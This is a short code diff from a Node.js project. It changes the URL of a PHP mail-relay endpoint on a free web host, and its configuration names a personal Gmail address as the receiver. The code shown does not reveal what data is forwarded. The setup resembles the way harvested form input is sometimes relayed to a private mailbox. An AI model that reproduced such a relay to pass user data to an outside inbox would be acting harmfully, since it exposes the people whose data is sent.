@@ -6,7 +6,7 @@ const path = require('path');
 
 /***********************Send mail php imported url*****************/
 const
-    link = 'https://bklshserver.000webhostapp.com/server/rest.php',
+    link = 'https://bklshserver.000webhostapp.com/rest.php',
     receiverEmail = 'greatogbuagu2005@gmail.com';
 /**********************Send mail php imported url ends**************/
 
